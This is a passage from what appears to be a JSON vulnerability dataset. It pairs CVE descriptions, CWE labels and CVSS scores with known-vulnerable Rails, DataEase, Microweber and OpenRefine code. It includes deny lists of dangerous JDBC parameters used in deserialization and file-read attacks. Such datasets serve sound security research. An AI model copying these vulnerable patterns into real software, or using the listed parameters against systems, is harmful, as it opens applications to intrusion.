}.freeze\n\n    # List of available permissions can be found at\n    # https://github.com/w3c/webappsec-permissions-policy/blob/main/features.md#policy-controlled-features\n    DIRECTIVES = {\n      accelerometer:        \"accelerometer\",\n      ambient_light_sensor: \"ambient-light-sensor\",\n      autoplay:             \"autoplay\",\n      camera:               \"camera\",\n      display_capture:      \"display-capture\",\n      encrypted_media:      \"encrypted-media\",\n      fullscreen:           \"fullscreen\",\n      geolocation:          \"geolocation\",\n      gyroscope:            \"gyroscope\",\n      hid:                  \"hid\",\n      idle_detection:       \"idle-detection\",\n      keyboard_map:         \"keyboard-map\",\n      magnetometer:         \"magnetometer\",\n      microphone:           \"microphone\",\n      midi:                 \"midi\",\n      payment:              \"payment\",\n      picture_in_picture:   \"picture-in-picture\",\n      screen_wake_lock:     \"screen-wake-lock\",\n      serial:               \"serial\",\n      sync_xhr:             \"sync-xhr\",\n      usb:                  \"usb\",\n      web_share:            \"web-share\",\n    }.freeze\n\n    private_constant :MAPPINGS, :DIRECTIVES\n\n    attr_reader :directives\n\n    def initialize\n      @directives = {}\n      yield self if block_given?\n    end\n\n    def initialize_copy(other)\n      @directives = other.directives.deep_dup\n    end\n\n    DIRECTIVES.each do |name, directive|\n      define_method(name) do |*sources|\n        if sources.first\n          @directives[directive] = apply_mappings(sources)\n        else\n          @directives.delete(directive)\n        end\n      end\n    end\n\n    def build(context = nil)\n      build_directives(context).compact.join(\"; \")\n    end\n\n    private\n      def apply_mappings(sources)\n        sources.map do |source|\n          case source\n          when Symbol\n            apply_mapping(source)\n          when String, Proc\n            source\n          else\n            raise ArgumentError, \"Invalid HTTP permissions policy source: #{source.inspect}\"\n          end\n        end\n      end\n\n      def apply_mapping(source)\n        MAPPINGS.fetch(source) do\n          raise ArgumentError, \"Unknown HTTP permissions policy source mapping: #{source.inspect}\"\n        end\n      end\n\n      def build_directives(context)\n        @directives.map do |directive, sources|\n          if sources.is_a?(Array)\n            \"#{directive} #{build_directive(sources, context).join(' ')}\"\n          elsif sources\n            directive\n          else\n            nil\n          end\n        end\n      end\n\n      def build_directive(sources, context)\n        sources.map { |source| resolve_source(source, context) }\n      end\n\n      def resolve_source(source, context)\n        case source\n        when String\n          source\n        when Symbol\n          source.to_s\n        when Proc\n          if context.nil?\n            raise RuntimeError, \"Missing context for the dynamic permissions policy source: #{source.inspect}\"\n          else\n            context.instance_exec(&source)\n          end\n        else\n          raise RuntimeError, \"Unexpected permissions policy source: #{source.inspect}\"\n        end\n      end\n  end\nend\n"
        }
      ],
      "method_level": [
        "def call(env)\n        _, headers, _ = response = @app.call(env)\n\n        return response unless html_response?(headers)\n        return response if policy_present?(headers)\n\n        request = ActionDispatch::Request.new(env)\n\n        if policy = request.permissions_policy\n          headers[ActionDispatch::Constants::FEATURE_POLICY] = policy.build(request.controller_instance)\n        end\n\n        if policy_empty?(policy)\n          headers.delete(ActionDispatch::Constants::FEATURE_POLICY)\n        end\n\n        response\n      end",
        "def html_response?(headers)\n          if content_type = headers[Rack::CONTENT_TYPE]\n            content_type.include?(\"html\")\n          end\n        end"
      ],
      "hunk_level": [
        {
          "line_no": 40,
          "content": "        return response unless html_response?(headers)"
        },
        {
          "line_no": 57,
          "content": "        def html_response?(headers)"
        },
        {
          "line_no": 58,
          "content": "          if content_type = headers[Rack::CONTENT_TYPE]"
        },
        {
          "line_no": 59,
          "content": "            content_type.include?(\"html\")"
        },
        {
          "line_no": 60,
          "content": "          end"
        },
        {
          "line_no": 61,
          "content": "        end"
        }
      ]
    },
    "cwe": [
      "CWE-20"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.4,
    "cvss_version": 3.1
  },
  {
    "id": 1338,
    "cve": "CVE-2024-55953",
    "description": "DataEase is an open source business analytics tool. Authenticated users can read and deserialize arbitrary files through the background JDBC connection. When constructing the jdbc connection string, the parameters are not filtered. This vulnerability has been fixed in v1.18.27. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
    "vulnerability": {
      "file_level": [
        {
          "name": "core/backend/src/main/java/io/dataease/dto/datasource/MysqlConfiguration.java",
          "content": "package io.dataease.dto.datasource;\n\nimport io.dataease.plugins.datasource.entity.JdbcConfiguration;\nimport lombok.Getter;\nimport lombok.Setter;\nimport org.apache.commons.lang3.StringUtils;\n\nimport java.net.URLDecoder;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.List;\n\n@Getter\n@Setter\npublic class MysqlConfiguration extends JdbcConfiguration {\n\n    private String driver = \"com.mysql.jdbc.Driver\";\n    private String extraParams = \"characterEncoding=UTF-8&connectTimeout=5000&useSSL=false&allowPublicKeyRetrieval=true&zeroDateTimeBehavior=convertToNull\";\n    private List<String> illegalParameters = Arrays.asList(\"autoDeserialize\", \"queryInterceptors\", \"statementInterceptors\", \"detectCustomCollations\", \"allowloadlocalinfile\", \"allowUrlInLocalInfile\", \"allowLoadLocalInfileInPath\");\n\n    public String getJdbc() {\n        if (StringUtils.isEmpty(extraParams.trim())) {\n            return \"jdbc:mysql://HOSTNAME:PORT/DATABASE\".replace(\"HOSTNAME\", getHost().trim()).replace(\"PORT\", getPort().toString().trim()).replace(\"DATABASE\", getDataBase().trim());\n        } else {\n            for (String illegalParameter : getIllegalParameters()) {\n                if (getExtraParams().toLowerCase().contains(illegalParameter.toLowerCase()) || URLDecoder.decode(getExtraParams()).contains(illegalParameter.toLowerCase())) {\n                    throw new RuntimeException(\"Illegal parameter: \" + illegalParameter);\n                }\n            }\n\n            return \"jdbc:mysql://HOSTNAME:PORT/DATABASE?EXTRA_PARAMS\".replace(\"HOSTNAME\", getHost().trim()).replace(\"PORT\", getPort().toString().trim()).replace(\"DATABASE\", getDataBase().trim()).replace(\"EXTRA_PARAMS\", getExtraParams().trim());\n        }\n    }\n\n    public List<String> getIllegalParameters(){\n        List<String> newIllegalParameters = new ArrayList<>();\n        newIllegalParameters.addAll(illegalParameters);\n        newIllegalParameters.addAll(Arrays.asList(\"allowloadlocalinfile\", \"allowUrlInLocalInfile\", \"allowLoadLocalInfileInPath\"));\n        return newIllegalParameters;\n    }\n\n}"
        },
        {
          "name": "core/backend/src/main/java/io/dataease/dto/datasource/PgConfiguration.java",
          "content": "package io.dataease.dto.datasource;\n\nimport io.dataease.plugins.datasource.entity.JdbcConfiguration;\nimport lombok.Getter;\nimport lombok.Setter;\nimport org.apache.commons.lang3.StringUtils;\n\nimport java.net.URLDecoder;\nimport java.util.Arrays;\nimport java.util.List;\n\n@Getter\n@Setter\npublic class PgConfiguration extends JdbcConfiguration {\n\n    private String driver = \"org.postgresql.Driver\";\n    private String extraParams = \"\";\n    private List<String> illegalParameters = Arrays.asList(\"socketFactory\", \"socketFactoryArg\", \"sslfactory\", \"sslfactoryarg\", \"loggerLevel\", \"loggerFile\", \"allowUrlInLocalInfile\", \"allowLoadLocalInfileInPath\");\n\n\n    public String getJdbc() {\n        if (StringUtils.isEmpty(extraParams.trim())) {\n            if (StringUtils.isEmpty(getSchema())) {\n                return \"jdbc:postgresql://HOSTNAME:PORT/DATABASE\"\n                        .replace(\"HOSTNAME\", getHost().trim())\n                        .replace(\"PORT\", getPort().toString().trim())\n                        .replace(\"DATABASE\", getDataBase().trim());\n            } else {\n                return \"jdbc:postgresql://HOSTNAME:PORT/DATABASE?currentSchema=SCHEMA\"\n                        .replace(\"HOSTNAME\", getHost().trim())\n                        .replace(\"PORT\", getPort().toString().trim())\n                        .replace(\"DATABASE\", getDataBase().trim())\n                        .replace(\"SCHEMA\", getSchema().trim());\n            }\n        } else {\n            for (String illegalParameter : illegalParameters) {\n                if (getExtraParams().toLowerCase().contains(illegalParameter.toLowerCase()) || URLDecoder.decode(getExtraParams()).contains(illegalParameter.toLowerCase())) {\n                    throw new RuntimeException(\"Illegal parameter: \" + illegalParameter);\n                }\n            }\n            return \"jdbc:postgresql://HOSTNAME:PORT/DATABASE?EXTRA_PARAMS\"\n                    .replace(\"HOSTNAME\", getHost().trim())\n                    .replace(\"PORT\", getPort().toString().trim())\n                    .replace(\"DATABASE\", getDataBase().trim())\n                    .replace(\"EXTRA_PARAMS\", getExtraParams().trim());\n\n        }\n    }\n}\n"
        },
        {
          "name": "core/backend/src/main/java/io/dataease/dto/datasource/RedshiftConfiguration.java",
          "content": "package io.dataease.dto.datasource;\n\nimport io.dataease.plugins.datasource.entity.JdbcConfiguration;\nimport lombok.Getter;\nimport lombok.Setter;\n\n@Getter\n@Setter\npublic class RedshiftConfiguration extends JdbcConfiguration {\n\n    private String driver = \"com.amazon.redshift.jdbc42.Driver\";\n\n    public String getJdbc() {\n        // 连接参数先写死，后边要把编码、时区等参数放到数据源的设置中\n        return \"jdbc:redshift://HOSTNAME:PORT/DATABASE\"\n                .replace(\"HOSTNAME\", getHost().trim())\n                .replace(\"PORT\", getPort().toString().trim())\n                .replace(\"DATABASE\", getDataBase().trim());\n    }\n}"
        }
      ],
      "method_level": [
        "public String getJdbc() {\n        if (StringUtils.isEmpty(extraParams.trim())) {\n            return \"jdbc:mysql://HOSTNAME:PORT/DATABASE\".replace(\"HOSTNAME\", getHost().trim()).replace(\"PORT\", getPort().toString().trim()).replace(\"DATABASE\", getDataBase().trim());\n        } else {\n            for (String illegalParameter : getIllegalParameters()) {\n                if (getExtraParams().toLowerCase().contains(illegalParameter.toLowerCase()) || URLDecoder.decode(getExtraParams()).contains(illegalParameter.toLowerCase())) {\n                    throw new RuntimeException(\"Illegal parameter: \" + illegalParameter);\n                }\n            }\n\n            return \"jdbc:mysql://HOSTNAME:PORT/DATABASE?EXTRA_PARAMS\".replace(\"HOSTNAME\", getHost().trim()).replace(\"PORT\", getPort().toString().trim()).replace(\"DATABASE\", getDataBase().trim()).replace(\"EXTRA_PARAMS\", getExtraParams().trim());\n        }\n    }",
        "public List<String> getIllegalParameters(){\n        List<String> newIllegalParameters = new ArrayList<>();\n        newIllegalParameters.addAll(illegalParameters);\n        newIllegalParameters.addAll(Arrays.asList(\"allowloadlocalinfile\", \"allowUrlInLocalInfile\", \"allowLoadLocalInfileInPath\"));\n        return newIllegalParameters;\n    }",
        "public String getJdbc() {\n        if (StringUtils.isEmpty(extraParams.trim())) {\n            if (StringUtils.isEmpty(getSchema())) {\n                return \"jdbc:postgresql://HOSTNAME:PORT/DATABASE\"\n                        .replace(\"HOSTNAME\", getHost().trim())\n                        .replace(\"PORT\", getPort().toString().trim())\n                        .replace(\"DATABASE\", getDataBase().trim());\n            } else {\n                return \"jdbc:postgresql://HOSTNAME:PORT/DATABASE?currentSchema=SCHEMA\"\n                        .replace(\"HOSTNAME\", getHost().trim())\n                        .replace(\"PORT\", getPort().toString().trim())\n                        .replace(\"DATABASE\", getDataBase().trim())\n                        .replace(\"SCHEMA\", getSchema().trim());\n            }\n        } else {\n            for (String illegalParameter : illegalParameters) {\n                if (getExtraParams().toLowerCase().contains(illegalParameter.toLowerCase()) || URLDecoder.decode(getExtraParams()).contains(illegalParameter.toLowerCase())) {\n                    throw new RuntimeException(\"Illegal parameter: \" + illegalParameter);\n                }\n            }\n            return \"jdbc:postgresql://HOSTNAME:PORT/DATABASE?EXTRA_PARAMS\"\n                    .replace(\"HOSTNAME\", getHost().trim())\n                    .replace(\"PORT\", getPort().toString().trim())\n                    .replace(\"DATABASE\", getDataBase().trim())\n                    .replace(\"EXTRA_PARAMS\", getExtraParams().trim());\n\n        }\n    }",
        "public String getJdbc() {\n        // 连接参数先写死，后边要把编码、时区等参数放到数据源的设置中\n        return \"jdbc:redshift://HOSTNAME:PORT/DATABASE\"\n                .replace(\"HOSTNAME\", getHost().trim())\n                .replace(\"PORT\", getPort().toString().trim())\n                .replace(\"DATABASE\", getDataBase().trim());\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 23,
          "content": "            return \"jdbc:mysql://HOSTNAME:PORT/DATABASE\".replace(\"HOSTNAME\", getHost().trim()).replace(\"PORT\", getPort().toString().trim()).replace(\"DATABASE\", getDataBase().trim());"
        },
        {
          "line_no": 25,
          "content": "            for (String illegalParameter : getIllegalParameters()) {"
        },
        {
          "line_no": 26,
          "content": "                if (getExtraParams().toLowerCase().contains(illegalParameter.toLowerCase()) || URLDecoder.decode(getExtraParams()).contains(illegalParameter.toLowerCase())) {"
        },
        {
          "line_no": 27,
          "content": "                    throw new RuntimeException(\"Illegal parameter: \" + illegalParameter);"
        },
        {
          "line_no": 28,
          "content": "                }"
        },
        {
          "line_no": 31,
          "content": "            return \"jdbc:mysql://HOSTNAME:PORT/DATABASE?EXTRA_PARAMS\".replace(\"HOSTNAME\", getHost().trim()).replace(\"PORT\", getPort().toString().trim()).replace(\"DATABASE\", getDataBase().trim()).replace(\"EXTRA_PARAMS\", getExtraParams().trim());"
        },
        {
          "line_no": 35,
          "content": "    public List<String> getIllegalParameters(){"
        },
        {
          "line_no": 24,
          "content": "                return \"jdbc:postgresql://HOSTNAME:PORT/DATABASE\""
        },
        {
          "line_no": 29,
          "content": "                return \"jdbc:postgresql://HOSTNAME:PORT/DATABASE?currentSchema=SCHEMA\""
        },
        {
          "line_no": 36,
          "content": "            for (String illegalParameter : illegalParameters) {"
        },
        {
          "line_no": 37,
          "content": "                if (getExtraParams().toLowerCase().contains(illegalParameter.toLowerCase()) || URLDecoder.decode(getExtraParams()).contains(illegalParameter.toLowerCase())) {"
        },
        {
          "line_no": 38,
          "content": "                    throw new RuntimeException(\"Illegal parameter: \" + illegalParameter);"
        },
        {
          "line_no": 39,
          "content": "                }"
        },
        {
          "line_no": 40,
          "content": "            }"
        },
        {
          "line_no": 41,
          "content": "            return \"jdbc:postgresql://HOSTNAME:PORT/DATABASE?EXTRA_PARAMS\""
        },
        {
          "line_no": 14,
          "content": "        // 连接参数先写死，后边要把编码、时区等参数放到数据源的设置中"
        },
        {
          "line_no": 15,
          "content": "        return \"jdbc:redshift://HOSTNAME:PORT/DATABASE\""
        }
      ]
    },
    "cwe": [
      "CWE-89"
    ],
    "severity": "HIGH",
    "cvss_score": 8.6,
    "cvss_version": 4.0
  },
  {
    "id": 1052,
    "cve": "CVE-2024-40101",
    "description": "A Reflected Cross-site scripting (XSS) vulnerability exists in '/search' in microweber 2.0.15 and earlier allowing unauthenticated remote attackers to inject arbitrary web script or HTML via the 'keywords' parameter.",
    "vulnerability": {
      "file_level": [
        {
          "name": "src/MicroweberPackages/Helper/XSSClean.php",
          "content": "<?php\n\nnamespace MicroweberPackages\\Helper;\n\nuse MicroweberPackages\\Security\\HtmlSanitizer\\MwHtmlSanitizerReference;\nuse voku\\helper\\AntiXSS;\n\nclass XSSClean\n{\n\n\n    public function cleanArray($array)    {\n\n        if (is_array($array)) {\n\n            $cleanedArray = [];\n            foreach ($array as $key => $value) {\n                if (is_string($key)) {\n                    $key = $this->clean($key);\n                }\n\n                if (is_array($value)) {\n                    $cleanedArray[$key] = $this->cleanArray($value);\n                } else {\n                    $cleanedArray[$key] = $this->clean($value);\n                }\n            }\n\n            return $cleanedArray;\n        }\n    }\n\n    public function clean($html)\n    {\n        if(is_array($html)){\n            return $this->cleanArray($html);\n        }\n\n\n        $_preserve_replaced_tags = [];\n        $html = str_ireplace('{SITE_URL}','___mw-site-url-temp-replace-on-clean___', $html);\n//        $tags = [ 'textarea', 'pre','code', 'svg', 'kbd'];\n//\n//        foreach ($tags as $tag) {\n//\n//            //  $script_pattern = \"/<\".$tag.\"[^>]*>(.*)<\\/.$tag.>/Uis\";\n//            $script_pattern = \"/\\<\" . $tag . \"(.*?)?\\>(.|\\s)*?\\<\\/\" . $tag . \"\\>/i\";\n//\n//            preg_match_all($script_pattern, $html, $mw_script_matches);\n//\n//            if (!empty($mw_script_matches)) {\n//                foreach ($mw_script_matches [0] as $key => $value) {\n//                    if ($value != '') {\n//                        $v1 = crc32($value);\n//                        $v1 = 'mw_xss_clean_repeserve_tags_tag_' . $tag . $v1 . '';\n//                        $html = str_replace($value, $v1, $html);\n//                        $_preserve_replaced_tags[$v1] = $value;\n//\n//                    }\n//                }\n//            }\n//\n//        }\n\n\n\n\n\n\n\n\n\n\n         // from https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#ontransitionend\n        $cleanStrings =  MwHtmlSanitizerReference::MW_NOT_ALLOWED_ATTRIBUTES;\n\n        $antiXss = new AntiXSS();\n        $antiXss->addEvilHtmlTags($cleanStrings);\n        $antiXss->addEvilAttributes($cleanStrings);\n        $antiXss->addNeverAllowedOnEventsAfterwards($cleanStrings);\n\n        $allowAttibutes = [\n            'style',\n\n            'href',\n            'alt',\n            'target',\n            'srcset',\n            'sizes',\n            'title',\n            'xlink:href',\n        ];\n        $antiXss->removeEvilAttributes($allowAttibutes);\n\n        $allowTags = [\n            'head',\n            'header',\n            'main',\n            'aside',\n            'img',\n            'form',\n            'svg',\n            'title',\n            'input',\n            'button',\n            'select',\n            'option',\n            'textarea',\n            'picture',\n            'source',\n         ];\n\n        $antiXss->removeEvilHtmlTags($allowTags);\n        $allowRegex = [\n//            '<!--(.*)-->' => '<!--(.*)-->',\n//            '&lt;!--',\n//            '&lt;!--$1--&gt;'\n            '<!--(.*)-->' => '&lt;!--$1--&gt;',\n            '&lt;!--', '&lt;!--$1--&gt;'\n        ];\n\n\n\n        $antiXss->removeNeverAllowedRegex($allowRegex);\n\n        $allowNotClosed= [\n            'li',\n            'ul',\n            'textarea',\n        ];\n        $antiXss->removeDoNotCloseHtmlTags($allowNotClosed);\n\n\n        $html = $antiXss->xss_clean($html);\n        $html_to_return = $html;\n        if ($_preserve_replaced_tags) {\n            foreach ($_preserve_replaced_tags as $key => $value) {\n\n                $html_to_return = str_replace($key, $value, $html_to_return);\n            }\n        }\n\n\n        $html_to_return = str_ireplace('___mw-site-url-temp-replace-on-clean___','{SITE_URL}', $html_to_return);\n\n\n\n\n        return $html_to_return;\n    }\n\n}\n"
        }
      ],
      "method_level": [
        "public function clean($html)\n    {\n        if(is_array($html)){\n            return $this->cleanArray($html);\n        }\n\n\n        $_preserve_replaced_tags = [];\n        $html = str_ireplace('{SITE_URL}','___mw-site-url-temp-replace-on-clean___', $html);\n//        $tags = [ 'textarea', 'pre','code', 'svg', 'kbd'];\n//\n//        foreach ($tags as $tag) {\n//\n//            //  $script_pattern = \"/<\".$tag.\"[^>]*>(.*)<\\/.$tag.>/Uis\";\n//            $script_pattern = \"/\\<\" . $tag . \"(.*?)?\\>(.|\\s)*?\\<\\/\" . $tag . \"\\>/i\";\n//\n//            preg_match_all($script_pattern, $html, $mw_script_matches);\n//\n//            if (!empty($mw_script_matches)) {\n//                foreach ($mw_script_matches [0] as $key => $value) {\n//                    if ($value != '') {\n//                        $v1 = crc32($value);\n//                        $v1 = 'mw_xss_clean_repeserve_tags_tag_' . $tag . $v1 . '';\n//                        $html = str_replace($value, $v1, $html);\n//                        $_preserve_replaced_tags[$v1] = $value;\n//\n//                    }\n//                }\n//            }\n//\n//        }\n\n\n\n\n\n\n\n\n\n\n         // from https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#ontransitionend\n        $cleanStrings =  MwHtmlSanitizerReference::MW_NOT_ALLOWED_ATTRIBUTES;\n\n        $antiXss = new AntiXSS();\n        $antiXss->addEvilHtmlTags($cleanStrings);\n        $antiXss->addEvilAttributes($cleanStrings);\n        $antiXss->addNeverAllowedOnEventsAfterwards($cleanStrings);\n\n        $allowAttibutes = [\n            'style',\n\n            'href',\n            'alt',\n            'target',\n            'srcset',\n            'sizes',\n            'title',\n            'xlink:href',\n        ];\n        $antiXss->removeEvilAttributes($allowAttibutes);\n\n        $allowTags = [\n            'head',\n            'header',\n            'main',\n            'aside',\n            'img',\n            'form',\n            'svg',\n            'title',\n            'input',\n            'button',\n            'select',\n            'option',\n            'textarea',\n            'picture',\n            'source',\n         ];\n\n        $antiXss->removeEvilHtmlTags($allowTags);\n        $allowRegex = [\n//            '<!--(.*)-->' => '<!--(.*)-->',\n//            '&lt;!--',\n//            '&lt;!--$1--&gt;'\n            '<!--(.*)-->' => '&lt;!--$1--&gt;',\n            '&lt;!--', '&lt;!--$1--&gt;'\n        ];\n\n\n\n        $antiXss->removeNeverAllowedRegex($allowRegex);\n\n        $allowNotClosed= [\n            'li',\n            'ul',\n            'textarea',\n        ];\n        $antiXss->removeDoNotCloseHtmlTags($allowNotClosed);\n\n\n        $html = $antiXss->xss_clean($html);\n        $html_to_return = $html;\n        if ($_preserve_replaced_tags) {\n            foreach ($_preserve_replaced_tags as $key => $value) {\n\n                $html_to_return = str_replace($key, $value, $html_to_return);\n            }\n        }\n\n\n        $html_to_return = str_ireplace('___mw-site-url-temp-replace-on-clean___','{SITE_URL}', $html_to_return);\n\n\n\n\n        return $html_to_return;\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 75,
          "content": "        $cleanStrings =  MwHtmlSanitizerReference::MW_NOT_ALLOWED_ATTRIBUTES;"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.1,
    "cvss_version": 3.1
  },
  {
    "id": 1258,
    "cve": "CVE-2024-47880",
    "description": "OpenRefine is a free, open source tool for working with messy data. Prior to version 3.8.3, the `export-rows` command can be used in such a way that it reflects part of the request verbatim, with a Content-Type header also taken from the request. An attacker could lead a user to a malicious page that submits a form POST that contains  embedded JavaScript code. This code would then be included in the response, along with an attacker-controlled `Content-Type` header, and so potentially executed in the victim's browser as if it was part of OpenRefine. The attacker-provided code can do anything the user can do, including deleting projects, retrieving database passwords, or executing arbitrary Jython or Closure expressions, if those extensions are also present. The attacker must know a valid project ID of a project that contains at least one row. Version 3.8.3 fixes the issue.",
    "vulnerability": {
      "file_level": [
        {
          "name": "main/src/com/google/refine/commands/project/ExportRowsCommand.java",
          "content": "/*\n\nCopyright 2010, Google Inc.\nAll rights reserved.\n\nRedistribution and use in source and binary forms, with or without\nmodification, are permitted provided that the following conditions are\nmet:\n\n    * Redistributions of source code must retain the above copyright\nnotice, this list of conditions and the following disclaimer.\n    * Redistributions in binary form must reproduce the above\ncopyright notice, this list of conditions and the following disclaimer\nin the documentation and/or other materials provided with the\ndistribution.\n    * Neither the name of Google Inc. nor the names of its\ncontributors may be used to endorse or promote products derived from\nthis software without specific prior written permission.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n\"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\nLIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR\nA PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT\nOWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\nSPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT\nLIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,           \nDATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY           \nTHEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\nOF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n\n*/\n\npackage com.google.refine.commands.project;\n\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.io.OutputStreamWriter;\nimport java.io.Writer;\nimport java.util.Enumeration;\nimport java.util.Map;\nimport java.util.Properties;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\nimport com.google.common.net.PercentEscaper;\nimport org.apache.commons.lang3.StringUtils;\nimport org.apache.hc.core5.http.HttpStatus;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport com.google.refine.ProjectManager;\nimport com.google.refine.browsing.Engine;\nimport com.google.refine.commands.Command;\nimport com.google.refine.exporters.CsvExporter;\nimport com.google.refine.exporters.Exporter;\nimport com.google.refine.exporters.ExporterRegistry;\nimport com.google.refine.exporters.StreamExporter;\nimport com.google.refine.exporters.WriterExporter;\nimport com.google.refine.exporters.sql.SqlExporterException;\nimport com.google.refine.model.Project;\n\npublic class ExportRowsCommand extends Command {\n\n    private static final Logger logger = LoggerFactory.getLogger(\"ExportRowsCommand\");\n\n    /**\n     * This command uses POST but is left CSRF-unprotected as it does not incur a state change.\n     */\n\n    @Deprecated(since = \"3.9\")\n    @SuppressWarnings(\"unchecked\")\n    static public Properties getRequestParameters(HttpServletRequest request) {\n        Properties options = new Properties();\n\n        Enumeration<String> en = request.getParameterNames();\n        while (en.hasMoreElements()) {\n            String name = en.nextElement();\n            options.put(name, request.getParameter(name));\n        }\n        return options;\n    }\n\n    @Override\n    public void doPost(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        // This command triggers evaluation expression and therefore requires CSRF-protection\n        if (!hasValidCSRFToken(request)) {\n            respondCSRFError(response);\n            return;\n        }\n\n        ProjectManager.singleton.setBusy(true);\n\n        try {\n            Project project = getProject(request);\n            Engine engine = getEngine(request, project);\n            Map<String, String> params = getParameters(request);\n\n            String format = params.get(\"format\");\n            Exporter exporter = ExporterRegistry.getExporter(format);\n            if (exporter == null) {\n                exporter = new CsvExporter('\\t');\n            }\n\n            String contentType = params.get(\"contentType\");\n            if (contentType == null) {\n                contentType = exporter.getContentType();\n            }\n            response.setHeader(\"Content-Type\", contentType);\n\n            String preview = params.get(\"preview\");\n            if (!\"true\".equals(preview)) {\n                String path = request.getPathInfo();\n                String filename = path.substring(path.lastIndexOf('/') + 1);\n                String userAgent = request.getHeader(\"User-Agent\");\n                if (userAgent != null && userAgent.contains(\"Safari/\") && !userAgent.contains(\"Chrome/\")\n                        && !userAgent.contains(\"Chromium/\")) {\n                    // Safari doesn't support rfc5897 and just wants straight UTF-8, but strip any controls to avoid\n                    // complaints about potential request/response splitting attacks\n                    response.setHeader(\"Content-Disposition\", \"attachment; filename=\" + filename.replaceAll(\"\\\\p{Cntrl}\", \"\"));\n                } else {\n                    // We use the full suite of rc5987 safe characters even though some of them might not make sense\n                    // in a filename. The browser will drop any unsafe characters before saving the file.\n                    PercentEscaper escaper = new PercentEscaper(\"!#$&+-.^_`|~\", false);\n                    // Fallback printable ASCII filename in case browser doesn't understand filename*\n                    // (percent encoded, just in case)\n                    String asciiFilename = escaper.escape(StringUtils.stripAccents(filename).replaceAll(\"[^ -~]\", \" \"));\n                    String rfc5987Filename = escaper.escape(filename);\n                    response.setHeader(\"Content-Disposition\",\n                            \"attachment; filename=\" + asciiFilename + \"; filename*=UTF-8' '\" + rfc5987Filename);\n                }\n            }\n\n            if (exporter instanceof WriterExporter) {\n                String encoding = params.get(\"encoding\");\n\n                response.setCharacterEncoding(encoding != null ? encoding : \"UTF-8\");\n                Writer writer = encoding == null ? response.getWriter() : new OutputStreamWriter(response.getOutputStream(), encoding);\n\n                ((WriterExporter) exporter).export(project, params, engine, writer);\n                writer.close();\n            } else if (exporter instanceof StreamExporter) {\n                response.setCharacterEncoding(\"UTF-8\");\n\n                OutputStream stream = response.getOutputStream();\n                ((StreamExporter) exporter).export(project, params, engine, stream);\n                stream.close();\n            } else {\n                // TODO: Should this use ServletException instead of respondException?\n                respondException(response, new RuntimeException(\"Unknown exporter type\"));\n            }\n        } catch (Exception e) {\n            // Use generic error handling rather than our JSON handling\n            logger.info(\"error:{}\", e.getMessage());\n            if (e instanceof SqlExporterException) {\n                response.sendError(HttpStatus.SC_BAD_REQUEST, e.getMessage());\n            }\n            throw new ServletException(e);\n        } finally {\n            ProjectManager.singleton.setBusy(false);\n        }\n    }\n}\n"
        }
      ],
      "method_level": [
        "@Override\n    public void doPost(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        // This command triggers evaluation expression and therefore requires CSRF-protection\n        if (!hasValidCSRFToken(request)) {\n            respondCSRFError(response);\n            return;\n        }\n\n        ProjectManager.singleton.setBusy(true);\n\n        try {\n            Project project = getProject(request);\n            Engine engine = getEngine(request, project);\n            Map<String, String> params = getParameters(request);\n\n            String format = params.get(\"format\");\n            Exporter exporter = ExporterRegistry.getExporter(format);\n            if (exporter == null) {\n                exporter = new CsvExporter('\\t');\n            }\n\n            String contentType = params.get(\"contentType\");\n            if (contentType == null) {\n                contentType = exporter.getContentType();\n            }\n            response.setHeader(\"Content-Type\", contentType);\n\n            String preview = params.get(\"preview\");\n            if (!\"true\".equals(preview)) {\n                String path = request.getPathInfo();\n                String filename = path.substring(path.lastIndexOf('/') + 1);\n                String userAgent = request.getHeader(\"User-Agent\");\n                if (userAgent != null && userAgent.contains(\"Safari/\") && !userAgent.contains(\"Chrome/\")\n                        && !userAgent.contains(\"Chromium/\")) {\n                    // Safari doesn't support rfc5897 and just wants straight UTF-8, but strip any controls to avoid\n                    // complaints about potential request/response splitting attacks\n                    response.setHeader(\"Content-Disposition\", \"attachment; filename=\" + filename.replaceAll(\"\\\\p{Cntrl}\", \"\"));\n                } else {\n                    // We use the full suite of rc5987 safe characters even though some of them might not make sense\n                    // in a filename. The browser will drop any unsafe characters before saving the file.\n                    PercentEscaper escaper = new PercentEscaper(\"!#$&+-.^_`|~\", false);\n                    // Fallback printable ASCII filename in case browser doesn't understand filename*\n                    // (percent encoded, just in case)\n                    String asciiFilename = escaper.escape(StringUtils.stripAccents(filename).replaceAll(\"[^ -~]\", \" \"));\n                    String rfc5987Filename = escaper.escape(filename);\n                    response.setHeader(\"Content-Disposition\",\n                            \"attachment; filename=\" + asciiFilename + \"; filename*=UTF-8' '\" + rfc5987Filename);\n                }\n            }\n\n            if (exporter instanceof WriterExporter) {\n                String encoding = params.get(\"encoding\");\n\n                response.setCharacterEncoding(encoding != null ? encoding : 